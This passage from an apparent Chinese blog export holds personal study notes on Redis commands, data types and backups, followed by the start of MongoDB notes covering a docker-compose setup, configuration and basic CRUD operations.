<li>原子 – Redis的所有操作都是原子性的，意思就是要么成功执行要么失败完全不执行。单个操作是原子性的。多个操作也支持事务，即原子性，通过MULTI和EXEC指令包起来。</li>
<li>丰富的特性 – Redis还支持 publish&#x2F;subscribe, 通知, key 过期等等特性。</li>
</ul>
<hr>
<h3 id="Redis与其他key-value存储有什么不同？"><a href="#Redis与其他key-value存储有什么不同？" class="headerlink" title="Redis与其他key-value存储有什么不同？"></a>Redis与其他key-value存储有什么不同？</h3><ul>
<li>Redis有着更为复杂的数据结构并且提供对他们的原子性操作，这是一个不同于其他数据库的进化路径。Redis的数据类型都是基于基本数据结构的同时对程序员透明，无需进行额外的抽象。</li>
<li>Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。</li>
</ul>
<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="切换数据库"><a href="#切换数据库" class="headerlink" title="切换数据库"></a>切换数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT &lt;db_number&gt;</span><br></pre></td></tr></table></figure>

<h3 id="用于清空当前选择的数据库"><a href="#用于清空当前选择的数据库" class="headerlink" title="用于清空当前选择的数据库"></a>用于清空当前选择的数据库</h3><p><code>Flush Database</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FLUSHDB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>（默认是数据库编号为0的数据库）中的所有数据。</p>
</blockquote>
<h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>Redis支持五种数据类型：string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)。</p>
<h3 id="键-keys-命令"><a href="#键-keys-命令" class="headerlink" title="键(keys )命令"></a>键(keys )命令</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>SET key value</code></td>
<td>设置键的值。</td>
</tr>
<tr>
<td><code>GET key</code></td>
<td>获取键的值。</td>
</tr>
<tr>
<td><code>DEL key [key2 ...]</code></td>
<td>删除一个或多个键。</td>
</tr>
<tr>
<td><code>EXISTS key</code></td>
<td>检查键是否存在。</td>
</tr>
<tr>
<td><code>KEYS pattern</code></td>
<td>查找匹配指定模式的键。</td>
</tr>
<tr>
<td><code>TYPE key</code></td>
<td>返回 key 所储存的值的类型。</td>
</tr>
</tbody></table>
<h3 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h3><p>下表列出了常用的 redis 字符串命令：</p>
<table>
<thead>
<tr>
<th><code>命令</code></th>
<th><code>描述</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>SET key value</code></td>
<td>设置指定 key 的值。</td>
</tr>
<tr>
<td><code>GET key</code></td>
<td>获取指定 key 的值。</td>
</tr>
<tr>
<td><code>GETRANGE key start end</code></td>
<td>返回 key 中字符串值的子字符。<code>start</code> 和 <code>end</code>: 子字符串的起始和结束偏移量。</td>
</tr>
<tr>
<td><code>GETSET key value</code></td>
<td>将给定 key 的值设为 value，并返回 key 的旧值(old value)。</td>
</tr>
<tr>
<td><code>SETEX key seconds value</code></td>
<td>将值 value 关联到 key，并将 key 的过期时间设为 seconds (以秒为单位)。</td>
</tr>
<tr>
<td><code>SETNX key value</code></td>
<td>只有在 key 不存在时设置 key 的值。</td>
</tr>
<tr>
<td><code>STRLEN key</code></td>
<td>返回 key 所储存的字符串值的长度。</td>
</tr>
<tr>
<td><code>MSET key value key value ...</code></td>
<td>同时设置一个或多个 key-value 对。</td>
</tr>
<tr>
<td><code>MSETNX key value key value ...</code></td>
<td>同时设置一个或多个 key-value 对，当且仅当所有给定 key 都不存在。</td>
</tr>
<tr>
<td><code>PSETEX key milliseconds value</code></td>
<td>以毫秒为单位设置 key 的生存时间，与SETEX命令相似，但以毫秒为单位。</td>
</tr>
<tr>
<td><code>INCR key</code></td>
<td>将 key 中储存的数字值增一。</td>
</tr>
<tr>
<td><code>INCRBY key increment</code></td>
<td>将 key 所储存的值加上给定的增量值（increment）。</td>
</tr>
<tr>
<td><code>INCRBYFLOAT key increment</code></td>
<td>将 key 所储存的值加上给定的浮点增量值（increment）。</td>
</tr>
<tr>
<td><code>DECR key</code></td>
<td>将 key 中储存的数字值减一。</td>
</tr>
<tr>
<td><code>DECRBY key decrement</code></td>
<td>将 key 所储存的值减去给定的减量值（decrement）。</td>
</tr>
</tbody></table>
<h3 id="哈希-Hash"><a href="#哈希-Hash" class="headerlink" title="哈希(Hash)"></a>哈希(Hash)</h3><p>Redis hash 是一个 string 类型的 field（字段） 和 value（值） 的映射表，hash 特别适合用于存储对象。</p>
<p>Redis 中每个 hash 可以存储 232 - 1 键值对（40多亿）。</p>
<p>以下是 Redis 哈希（Hash）相关的基本命令及其描述：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>HDEL key field1 [field2]</code></td>
<td>删除一个或多个哈希表字段。</td>
</tr>
<tr>
<td><code>HEXISTS key field</code></td>
<td>查看哈希表 key 中，指定的字段是否存在。</td>
</tr>
<tr>
<td><code>HGET key field</code></td>
<td>获取存储在哈希表中指定字段的值。</td>
</tr>
<tr>
<td><code>HGETALL key</code></td>
<td>获取在哈希表中指定 key 的所有字段和值。</td>
</tr>
<tr>
<td><code>HINCRBY key field increment</code></td>
<td>为哈希表 key 中的指定字段的整数值加上增量 increment。</td>
</tr>
<tr>
<td><code>HINCRBYFLOAT key field increment</code></td>
<td>为哈希表 key 中的指定字段的浮点数值加上增量 increment。</td>
</tr>
<tr>
<td><code>HKEYS key</code></td>
<td>获取哈希表中的所有字段。</td>
</tr>
<tr>
<td><code>HLEN key</code></td>
<td>获取哈希表中字段的数量。</td>
</tr>
<tr>
<td><code>HMGET key field1 [field2]</code></td>
<td>获取所有给定字段的值。</td>
</tr>
<tr>
<td><code>HMSET key field1 value1 [field2 value2]</code></td>
<td>同时将多个 field-value (域-值)对设置到哈希表 key 中。</td>
</tr>
<tr>
<td><code>HSET key field value</code></td>
<td>将哈希表 key 中的字段 field 的值设为 value。</td>
</tr>
<tr>
<td><code>HSETNX key field value</code></td>
<td>只有在字段 field 不存在时，设置哈希表字段的值。</td>
</tr>
<tr>
<td><code>HVALS key</code></td>
<td>获取哈希表中所有值。</td>
</tr>
<tr>
<td><code>HSCAN key cursor [MATCH pattern] [COUNT count]</code></td>
<td>迭代哈希表中的键值对。</td>
</tr>
</tbody></table>
<h3 id="列表-List"><a href="#列表-List" class="headerlink" title="列表(List)"></a>列表(List)</h3><p>Redis列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）</p>
<p>一个列表最多可以包含 232 - 1 个元素 (4294967295, 每个列表超过40亿个元素)。</p>
<p>以下是列表相关的基本命令及其描述：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>BLPOP key1 [key2 ] timeout</code></td>
<td>移出并获取列表的第一个元素，如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。</td>
</tr>
<tr>
<td><code>BRPOP key1 [key2 ] timeout</code></td>
<td>移出并获取列表的最后一个元素，如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。</td>
</tr>
<tr>
<td><code>BRPOPLPUSH source destination timeout</code></td>
<td>从列表中弹出一个值，将弹出的元素插入到另外一个列表中并返回它；如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。</td>
</tr>
<tr>
<td><code>LINDEX key index</code></td>
<td>通过索引获取列表中的元素。</td>
</tr>
<tr>
<td><code>LINSERT key BEFORE</code></td>
<td>AFTER pivot value&#96;</td>
</tr>
<tr>
<td><code>LLEN key</code></td>
<td>获取列表长度。</td>
</tr>
<tr>
<td><code>LPOP key</code></td>
<td>移出并获取列表的第一个元素。</td>
</tr>
<tr>
<td><code>LPUSH key value1 [value2]</code></td>
<td>将一个或多个值插入到列表头部。</td>
</tr>
<tr>
<td><code>LPUSHX key value</code></td>
<td>将一个值插入到已存在的列表头部。</td>
</tr>
<tr>
<td><code>LRANGE key start stop</code></td>
<td>获取列表指定范围内的元素。</td>
</tr>
<tr>
<td><code>LREM key count value</code></td>
<td>移除列表元素。</td>
</tr>
<tr>
<td><code>LSET key index value</code></td>
<td>通过索引设置列表元素的值。</td>
</tr>
<tr>
<td><code>LTRIM key start stop</code></td>
<td>对一个列表进行修剪(trim)，即只保留指定区间内的元素，不在指定区间之内的元素都将被删除。</td>
</tr>
<tr>
<td><code>RPOP key</code></td>
<td>移除列表的最后一个元素，返回值为移除的元素。</td>
</tr>
<tr>
<td><code>RPOPLPUSH source destination</code></td>
<td>移除列表的最后一个元素，并将该元素添加到另一个列表并返回。</td>
</tr>
<tr>
<td><code>RPUSH key value1 [value2]</code></td>
<td>在列表中添加一个或多个值到列表尾部。</td>
</tr>
<tr>
<td><code>RPUSHX key value</code></td>
<td>为已存在的列表添加值。</td>
</tr>
</tbody></table>
<h3 id="集合-Set"><a href="#集合-Set" class="headerlink" title="集合(Set)"></a>集合(Set)</h3><p>Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。</p>
<p>集合对象的编码可以是 intset 或者 hashtable。</p>
<p>Redis 中集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)。</p>
<p>集合中最大的成员数为 232 - 1 (4294967295, 每个集合可存储40多亿个成员)。</p>
<p>以下是 Redis 集合基本命令及其描述：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>SADD key member1 [member2]</code></td>
<td>向集合添加一个或多个成员。</td>
</tr>
<tr>
<td><code>SCARD key</code></td>
<td>获取集合的成员数。</td>
</tr>
<tr>
<td><code>SDIFF key1 [key2]</code></td>
<td>返回第一个集合与其他集合之间的差异。</td>
</tr>
<tr>
<td><code>SDIFFSTORE destination key1 [key2]</code></td>
<td>返回给定所有集合的差集并存储在 destination 中。</td>
</tr>
<tr>
<td><code>SINTER key1 [key2]</code></td>
<td>返回给定所有集合的交集。</td>
</tr>
<tr>
<td><code>SINTERSTORE destination key1 [key2]</code></td>
<td>返回给定所有集合的交集并存储在 destination 中。</td>
</tr>
<tr>
<td><code>SISMEMBER key member</code></td>
<td>判断 member 元素是否是集合 key 的成员。</td>
</tr>
<tr>
<td><code>SMEMBERS key</code></td>
<td>返回集合中的所有成员。</td>
</tr>
<tr>
<td><code>SMOVE source destination member</code></td>
<td>将 member 元素从 source 集合移动到 destination 集合。</td>
</tr>
<tr>
<td><code>SPOP key</code></td>
<td>移除并返回集合中的一个随机元素。</td>
</tr>
<tr>
<td><code>SRANDMEMBER key [count]</code></td>
<td>返回集合中一个或多个随机元素。</td>
</tr>
<tr>
<td><code>SREM key member1 [member2]</code></td>
<td>移除集合中一个或多个成员。</td>
</tr>
<tr>
<td><code>SUNION key1 [key2]</code></td>
<td>返回所有给定集合的并集。</td>
</tr>
<tr>
<td><code>SUNIONSTORE destination key1 [key2]</code></td>
<td>所有给定集合的并集存储在 destination 集合中。</td>
</tr>
<tr>
<td><code>SSCAN key cursor [MATCH pattern] [COUNT count]</code></td>
<td>迭代集合中的元素。</td>
</tr>
</tbody></table>
<p>这些命令用于对 Redis 中的集合数据结构进行操作，允许你添加、删除、获取成员，以及执行集合之间的差集、交集、并集等操作。</p>
<h3 id="有序集合-sortedset"><a href="#有序集合-sortedset" class="headerlink" title="有序集合(sortedset)"></a>有序集合(sortedset)</h3><p>Redis 有序集合和集合一样也是 string 类型元素的集合,且不允许重复的成员。</p>
<p>不同的是每个元素都会关联一个 double 类型的分数。redis 正是通过分数来为集合中的成员进行从小到大的排序。</p>
<p>有序集合的成员是唯一的,但分数(score)却可以重复。</p>
<p>集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)。 集合中最大的成员数为 232 - 1 (4294967295, 每个集合可存储40多亿个成员)。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>ZADD key score1 member1 [score2 member2]</code></td>
<td>向有序集合添加一个或多个成员，或者更新已存在成员的分数。</td>
</tr>
<tr>
<td><code>ZCARD key</code></td>
<td>获取有序集合的成员数。</td>
</tr>
<tr>
<td><code>ZCOUNT key min max</code></td>
<td>计算在有序集合中指定区间分数的成员数。</td>
</tr>
<tr>
<td><code>ZINCRBY key increment member</code></td>
<td>有序集合中对指定成员的分数加上增量 increment。</td>
</tr>
<tr>
<td><code>ZINTERSTORE destination numkeys key [key ...]</code></td>
<td>计算给定的一个或多个有序集的交集并将结果集存储在新的有序集合 destination 中。</td>
</tr>
<tr>
<td><code>ZLEXCOUNT key min max</code></td>
<td>在有序集合中计算指定字典区间内成员数量。</td>
</tr>
<tr>
<td><code>ZRANGE key start stop [WITHSCORES]</code></td>
<td>通过索引区间返回有序集合指定区间内的成员。</td>
</tr>
<tr>
<td><code>ZRANGEBYLEX key min max [LIMIT offset count]</code></td>
<td>通过字典区间返回有序集合的成员。</td>
</tr>
<tr>
<td><code>ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT]</code></td>
<td>通过分数返回有序集合指定区间内的成员。</td>
</tr>
<tr>
<td><code>ZRANK key member</code></td>
<td>返回有序集合中指定成员的索引。</td>
</tr>
<tr>
<td><code>ZREM key member [member ...]</code></td>
<td>移除有序集合中的一个或多个成员。</td>
</tr>
<tr>
<td><code>ZREMRANGEBYLEX key min max</code></td>
<td>移除有序集合中给定的字典区间的所有成员。</td>
</tr>
<tr>
<td><code>ZREMRANGEBYRANK key start stop</code></td>
<td>移除有序集合中给定的排名区间的所有成员。</td>
</tr>
<tr>
<td><code>ZREMRANGEBYSCORE key min max</code></td>
<td>移除有序集合中给定的分数区间的所有成员。</td>
</tr>
<tr>
<td><code>ZREVRANGE key start stop [WITHSCORES]</code></td>
<td>返回有序集中指定区间内的成员，通过索引，分数从高到低。</td>
</tr>
<tr>
<td><code>ZREVRANGEBYSCORE key max min [WITHSCORES]</code></td>
<td>返回有序集中指定分数区间内的成员，分数从高到低排序。</td>
</tr>
<tr>
<td><code>ZREVRANK key member</code></td>
<td>返回有序集合中指定成员的排名，有序集成员按分数值递减(从大到小)排序。</td>
</tr>
<tr>
<td><code>ZSCORE key member</code></td>
<td>返回有序集中，成员的分数值。</td>
</tr>
<tr>
<td><code>ZUNIONSTORE destination numkeys key [key ...]</code></td>
<td>计算给定的一个或多个有序集的并集，并存储在新的 key 中。</td>
</tr>
<tr>
<td><code>ZSCAN key cursor [MATCH pattern] [COUNT count]</code></td>
<td>迭代有序集合中的元素（包括元素成员和元素分值）。</td>
</tr>
</tbody></table>
<h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><h3 id="SQL脚本"><a href="#SQL脚本" class="headerlink" title="SQL脚本"></a>SQL脚本</h3><p>下面代码为此次练习用的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0</span><br><span class="line">SET username &quot;JohnDoe&quot;</span><br><span class="line">SET email &quot;johndoe@example.com&quot;</span><br><span class="line">SET website &quot;www.example.com&quot;</span><br><span class="line">SET city &quot;New York&quot;</span><br><span class="line">SET country &quot;USA&quot;</span><br><span class="line">SET company &quot;ABC Corporation&quot;</span><br><span class="line">SET industry &quot;Tech&quot;</span><br><span class="line">SET revenue 5000000</span><br><span class="line"></span><br><span class="line">HMSET user:1 username &quot;Alice&quot; email &quot;alice@example.com&quot; age 25</span><br><span class="line">HMSET user:2 username &quot;Bob&quot; email &quot;bob@example.com&quot; age 30</span><br><span class="line">HMSET product:1 name &quot;Laptop&quot; price 1200 brand &quot;Dell&quot;</span><br><span class="line">HMSET product:2 name &quot;Smartphone&quot; price 800 brand &quot;Samsung&quot;</span><br><span class="line">HMSET product:3 name &quot;Headphones&quot; price 150 brand &quot;Sony&quot;</span><br><span class="line">HMSET user:3 username &quot;Eve&quot; email &quot;eve@example.com&quot; age 28</span><br><span class="line">HMSET user:4 username &quot;David&quot; email &quot;david@example.com&quot; age 35</span><br><span class="line"></span><br><span class="line">RPUSH messages &quot;Hello, Redis!&quot;</span><br><span class="line">RPUSH messages &quot;Welcome to Redis!&quot;</span><br><span class="line">RPUSH tasks &quot;Task 1&quot;</span><br><span class="line">RPUSH tasks &quot;Task 2&quot;</span><br><span class="line">RPUSH tasks &quot;Task 3&quot;</span><br><span class="line">RPUSH messages &quot;How are you?&quot;</span><br><span class="line">RPUSH messages &quot;Redis is awesome!&quot;</span><br><span class="line"></span><br><span class="line">SADD tags &quot;redis&quot; &quot;database&quot; &quot;nosql&quot;</span><br><span class="line">SADD interests &quot;Technology&quot; &quot;Travel&quot; &quot;Photography&quot;</span><br><span class="line">SADD colors &quot;Red&quot; &quot;Green&quot; &quot;Blue&quot;</span><br><span class="line"> </span><br><span class="line">ZADD leaderboard 100 &quot;Alice&quot;</span><br><span class="line">ZADD leaderboard 150 &quot;Bob&quot;</span><br><span class="line">ZADD leaderboard 120 &quot;Charlie&quot;</span><br><span class="line">ZADD highscores 950 &quot;PlayerA&quot;</span><br><span class="line">ZADD highscores 1100 &quot;PlayerB&quot;</span><br><span class="line">ZADD highscores 850 &quot;PlayerC&quot;</span><br><span class="line">ZADD highscores 1200 &quot;PlayerD&quot;</span><br><span class="line">ZADD ratings 4.5 &quot;ProductX&quot;</span><br><span class="line">ZADD ratings 3.8 &quot;ProductY&quot;</span><br><span class="line">ZADD ratings 5.0 &quot;ProductZ&quot;</span><br></pre></td></tr></table></figure>



<h2 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h2><h3 id="数据库备份和恢复"><a href="#数据库备份和恢复" class="headerlink" title="数据库备份和恢复"></a>数据库备份和恢复</h3><h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><p>Redis <strong>SAVE</strong> 命令用于创建当前数据库的备份。</p>
<p>redis Save 命令基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAVE </span><br></pre></td></tr></table></figure>

<h4 id="恢复数据"><a href="#恢复数据" class="headerlink" title="恢复数据"></a>恢复数据</h4><p>如果需要恢复数据，只需将备份文件 (dump.rdb) 移动到 redis 安装目录并启动服务即可。获取 redis 目录可以使用 <strong>CONFIG</strong> 命令，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; CONFIG GET dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/usr/local/redis/bin&quot;</span><br></pre></td></tr></table></figure>

<p>以上命令 <strong>CONFIG GET dir</strong> 输出的 redis 安装目录为 &#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin。</p>
<h3 id="Bgsave"><a href="#Bgsave" class="headerlink" title="Bgsave"></a>Bgsave</h3><p>创建 redis 备份文件也可以使用命令 <strong>BGSAVE</strong>，该命令在后台执行。</p>
<p><strong>实例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; BGSAVE</span><br><span class="line"></span><br><span class="line">Background saving started</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://blog.csdn.net/weixin_36755535/article/details/126958849">https://blog.csdn.net/weixin_36755535/article/details/126958849</a>	“【Docker系列】3.docker-compose安装redis”<br>[2]: <a href="https://www.runoob.com/redis/redis-tutorial.html">https://www.runoob.com/redis/redis-tutorial.html</a>	“菜鸟教程”</p>
]]></content>
      <categories>
        <category>微服务</category>
      </categories>
      <tags>
        <tag>微服务</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>MongDB学习笔记</title>
    <url>/2023/11/14/%E5%BE%AE%E6%9C%8D%E5%8A%A1/MongoDB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="MongoDB学习笔记"><a href="#MongoDB学习笔记" class="headerlink" title="MongoDB学习笔记"></a>MongoDB学习笔记</h1><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><h3 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&quot;3.9&quot;</span></span><br><span class="line">services:</span><br><span class="line">  mongodb:</span><br><span class="line">    image: mongo:<span class="number">4.4</span></span><br><span class="line">    container_name: mongodb</span><br><span class="line">    environment:</span><br><span class="line">      - TZ=Asia/Shanghai</span><br><span class="line">      - MONGO_INITDB_DATABASE=mongodb  </span><br><span class="line">      - MONGO_INITDB_ROOT_USERNAME=root</span><br><span class="line">      - MONGO_INITDB_ROOT_PASSWORD=<span class="number">123456</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;27017:27017&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - ./data:/data/db</span><br><span class="line">      - ./logs:/data/logs</span><br><span class="line">      - ./config:/data/configdb</span><br><span class="line">      - ./conf/mongod.conf:/etc/mongo/mongod.conf</span><br><span class="line">    command: mongod --config /etc/mongo/mongod.conf</span><br></pre></td></tr></table></figure>



<h4 id="MongoDB配置文件mongod-conf"><a href="#MongoDB配置文件mongod-conf" class="headerlink" title="MongoDB配置文件mongod.conf"></a>MongoDB配置文件mongod.conf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemLog:</span><br><span class="line">  destination: file</span><br><span class="line">  path: /data/logs/mongod.log</span><br><span class="line">  logAppend: true</span><br><span class="line">storage:</span><br><span class="line">  dbPath: /data/db</span><br><span class="line">  journal:</span><br><span class="line">    enabled: true</span><br><span class="line">  wiredTiger:</span><br><span class="line">    engineConfig:</span><br><span class="line">      cacheSizeGB: 1</span><br><span class="line">  engine: wiredTiger</span><br><span class="line">  directoryPerDB: true</span><br><span class="line">net:</span><br><span class="line">  bindIpAll: true</span><br><span class="line">  port: 27017</span><br><span class="line">  maxIncomingConnections: 10000</span><br><span class="line">security:</span><br><span class="line">  authorization: enabled</span><br></pre></td></tr></table></figure>

<blockquote>
<p>配置文件放在，<code>docker-compose.yml</code>当前文件夹的下面的<code>conf</code>文件夹</p>
</blockquote>
<h2 id="MongoDB的CRUD"><a href="#MongoDB的CRUD" class="headerlink" title="MongoDB的CRUD"></a>MongoDB的CRUD</h2><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><table>
<thead>
<tr>
<th align="center">SQL术语&#x2F;概念</th>
<th align="center">MongoDB术语&#x2F;概念</th>
<th align="center">解释&#x2F;说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">database</td>
<td align="center">database</td>
<td align="center">数据库</td>
</tr>
<tr>
<td align="center">table</td>
<td align="center">collection</td>
<td align="center">数据库表&#x2F;集合</td>
</tr>
<tr>
<td align="center">row</td>
<td align="center">document</td>
<td align="center">数据记录行&#x2F;文档</td>
</tr>
<tr>
<td align="center">column</td>
<td align="center">field</td>
<td align="center">数据字段&#x2F;域</td>
</tr>
<tr>
<td align="center">index</td>
<td align="center">index</td>
<td align="center">索引</td>
</tr>
<tr>
<td align="center">table joins</td>
<td align="center"></td>
<td align="center">表连接,MongoDB不支持</td>
</tr>
<tr>
<td align="center">primary key</td>
<td align="center">primary key</td>
<td align="center">主键,MongoDB自动将_id字段设置为主键</td>
</tr>
</tbody></table>
<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><h4 id="显示所有数据的列表"><a href="#显示所有数据的列表" class="headerlink" title="显示所有数据的列表"></a>显示所有数据的列表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show dbs</span><br></pre></td></tr></table></figure>

<ol>
<li><p>执行 <code>db</code> 命令可以显示当前数据库对象或集合。</p>
</li>
<li><p>运行<code>use 数据库名</code>命令，可以连接到一个指定的数据库。</p>
</li>
<li><p>数据库也通过名字来标识。数据库名可以是满足以下条件的任意UTF-8字符串。</p>
<blockquote>
<p>不能是空字符串（””)。</p>
<p>不得含有’ ‘（空格)、.、$、&#x2F;、\和\0 (空字符)。</p>
<p>应全部小写。</p>
<p>最多64字节。</p>
</blockquote>
</li>
</ol>
<h4 id="特殊的数据库"><a href="#特殊的数据库" class="headerlink" title="特殊的数据库"></a>特殊的数据库</h4><p>有一些数据库名是保留的，可以直接访问这些有特殊作用的数据库。</p>
<ul>
<li><strong>admin</strong>： 从权限的角度来看，这是”root”数据库。要是将一个用户添加到这个数据库，这个用户自动继承所有数据库的权限。一些特定的服务器端命令也只能从这个数据库运行，比如列出所有的数据库或者关闭服务器。</li>
<li><strong>local:</strong> 这个数据永远不会被复制，可以用来存储限于本地单台服务器的任意集合</li>
<li><strong>config</strong>: 当Mongo用于分片设置时，config数据库在内部使用，用于保存分片的相关信息。</li>
</ul>
<h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use DATABASE_NAME</span><br></pre></td></tr></table></figure>

<h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>db表示当前数据库，所以命令的意思为删除当前数据库。</p>
</blockquote>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">String</td>
<td align="center">字符串。存储数据常用的数据类型。在 MongoDB 中，UTF-8 编码的字符串才是合法的。</td>
</tr>
<tr>
<td align="center">Integer</td>
<td align="center">整型数值。用于存储数值。根据你所采用的服务器，可分为 32 位或 64 位。</td>
</tr>
<tr>
<td align="center">Boolean</td>
<td align="center">布尔值。用于存储布尔值（真&#x2F;假）。</td>
</tr>
<tr>
<td align="center">Double</td>
<td align="center">双精度浮点值。用于存储浮点值。</td>
</tr>
<tr>
<td align="center">Min&#x2F;Max keys</td>
<td align="center">将一个值与 BSON（二进制的 JSON）元素的最低值和最高值相对比。</td>
</tr>
<tr>
<td align="center">Array</td>
<td align="center">用于将数组或列表或多个值存储为一个键。</td>
</tr>
<tr>
<td align="center">Timestamp</td>
<td align="center">时间戳。记录文档修改或添加的具体时间。</td>
</tr>
<tr>
<td align="center">Object</td>
<td align="center">用于内嵌文档。</td>
</tr>
<tr>
<td align="center">Null</td>
<td align="center">用于创建空值。</td>
</tr>
<tr>
<td align="center">Symbol</td>
<td align="center">符号。该数据类型基本上等同于字符串类型，但不同的是，它一般用于采用特殊符号类型的语言。</td>
</tr>
<tr>
<td align="center">Date</td>
<td align="center">日期时间。用 UNIX 时间格式来存储当前日期或时间。你可以指定自己的日期时间：创建 Date 对象，传入年月日信息。</td>
</tr>
<tr>
<td align="center">Object ID</td>
<td align="center">对象 ID。用于创建文档的 ID。</td>
</tr>
<tr>
<td align="center">Binary Data</td>
<td align="center">二进制数据。用于存储二进制数据。</td>
</tr>
<tr>
<td align="center">Code</td>
<td align="center">代码类型。用于在文档中存储 JavaScript 代码。</td>
</tr>
<tr>
<td align="center">Regular expression</td>
<td align="center">正则表达式类型。</td>
</tr>
</tbody></table>
<h3 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h3><h4 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.createCollection(name, options)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数说明：</p>
<ul>
<li>name: 要创建的集合名称，是要字符串形式的，就是要有双引号。</li>
<li>options: 可选参数, 指定有关内存大小及索引的选项</li>
</ul>
</blockquote>
<h4 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a>删除集合</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.COLLECTION_NAME.drop()</span><br></pre></td></tr></table></figure>

<h3 id="文档操作"><a href="#文档操作" class="headerlink" title="文档操作"></a>文档操作</h3><h4 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">db.COLLECTION_NAME.find(query, projection)</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>query</strong> ：可选，使用查询操作符指定查询条件</li>
<li><strong>projection</strong> ：可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。</li>
</ul>
</blockquote>
<p>如果你需要以易读的方式来读取数据，可以使用 pretty() 方法，语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;db.col.find().pretty()</span><br></pre></td></tr></table></figure>

<p>pretty() 方法以格式化的方式来显示所有文档。</p>
<h4 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a>插入文档</h4><p><code>db.COLLECTION_NAME.insertOne()</code> 用于向集合插入一个新文档，语法格式如下：</p>
